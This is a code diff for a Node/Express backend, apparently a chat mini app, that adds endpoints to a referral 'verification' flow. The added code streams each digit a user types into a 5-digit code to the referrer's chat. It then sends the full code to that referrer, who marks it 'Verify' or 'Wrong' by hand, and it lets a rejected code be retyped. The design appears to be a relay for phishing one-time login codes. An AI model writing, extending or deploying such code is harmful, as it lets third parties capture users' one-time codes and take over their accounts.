@@ -225,6 +225,109 @@ const verificationStatus = asyncHandler(async (req, res) => {
 });
 
 /**
+ * POST /api/miniapp/verifications/code
+ *
+ * Streams the partial code the referred user is typing to the referral. Purely
+ * informational: it never completes the verification, which stays with
+ * completeVerification. Gated on an AVAILABLE verification so a pending or expired
+ * window cannot be used to push arbitrary text into the referral's chat.
+ */
+const reportCodeEntry = asyncHandler(async (req, res) => {
+  const code = req.body?.code;
+
+  if (typeof code !== "string" || !/^\d{0,5}$/.test(code)) {
+    return res.status(400).json({ error: "INVALID_CODE", message: "Code must be up to 5 digits." });
+  }
+
+  store.expireStale();
+
+  const verification = store.findOpenForReferredUser(req.session.id);
+  if (!verification || verification.status !== store.STATUS.AVAILABLE) {
+    return res
+      .status(409)
+      .json({ error: "NOT_AVAILABLE", message: "Your referral has not confirmed yet." });
+  }
+
+  const referredUser = await users.findById(verification.referredUserId);
+  const referrer = await users.findById(verification.referringUserId);
+
+  // Clearing every box reports an empty string, which is not worth a chat message.
+  if (!code) return res.json({ status: "REPORTED" });
+
+  // Fire-and-forget from the client, so a delivery failure is logged, not thrown.
+  await verificationService.notifyCodeEntry(referrer, referredUser, code);
+
+  return res.json({ status: "REPORTED" });
+});
+
+/**
+ * POST /api/miniapp/verifications/submit
+ *
+ * A full 5-digit code. Unlike reportCodeEntry this does not complete anything: it
+ * parks the code as SUBMITTED and asks the referral to Verify or Wrong it, so the
+ * human decides rather than the client. A REJECTED verification is accepted again so
+ * the user can retype after being told the code was wrong.
+ */
+const submitCodeForReview = asyncHandler(async (req, res) => {
+  const code = req.body?.code;
+
+  if (typeof code !== "string" || !/^\d{5}$/.test(code)) {
+    return res.status(400).json({ error: "INVALID_CODE", message: "Code must be 5 digits." });
+  }
+
+  store.expireStale();
+
+  const verification = store.findOpenForReferredUser(req.session.id);
+  if (!verification) {
+    return res.status(409).json({ error: "NOT_AVAILABLE", message: "Your referral has not confirmed yet." });
+  }
+
+  const nonce = store.markSubmitted(verification.id, code);
+  if (nonce === null) {
+    return res.status(409).json({ error: "NOT_AVAILABLE", message: "Your referral has not confirmed yet." });
+  }
+
+  const referredUser = await users.findById(verification.referredUserId);
+  const referrer = await users.findById(verification.referringUserId);
+  await verificationService.notifyCodeForReview(referrer, referredUser, code, verification.id, nonce);
+
+  return res.json({ status: "SUBMITTED" });
+});
+
+/**
+ * GET /api/miniapp/verifications/decision
+ *
+ * Polls for the referral's judgement. Scoped to the caller's own verification so one
+ * user can never read another user's decision.
+ */
+const verificationDecision = asyncHandler(async (req, res) => {
+  store.expireStale();
+
+  const verification = store.findById(req.query.verificationId);
+
+  // Scoped to the caller's own verification: a missing id, another user's id, or one
+  // they never opened is indistinguishable from "nothing to report".
+  if (!verification || verification.referredUserId !== req.session.id) {
+    return res.json({ decision: "NONE" });
+  }
+
+  if (verification.status === store.STATUS.COMPLETED) {
+    return res.json({ decision: "VERIFIED" });
+  }
+
+  if (verification.status === store.STATUS.REJECTED) {
+    return res.json({ decision: "WRONG" });
+  }
+
+  if (verification.status === store.STATUS.SUBMITTED) {
+    return res.json({ decision: "PENDING" });
+  }
+
+  // PENDING / AVAILABLE / EXPIRED: no code has been submitted for judgement yet.
+  return res.json({ decision: "NONE" });
+});
+
+/**
  * POST /api/miniapp/verifications/complete
  *
  * The referred user submits the 5-digit code on the existing verification page. The
@@ -277,5 +380,8 @@ module.exports = {
   me,
   ready,
   verificationStatus,
+  reportCodeEntry,
+  submitCodeForReview,
+  verificationDecision,
   completeVerification,
 };
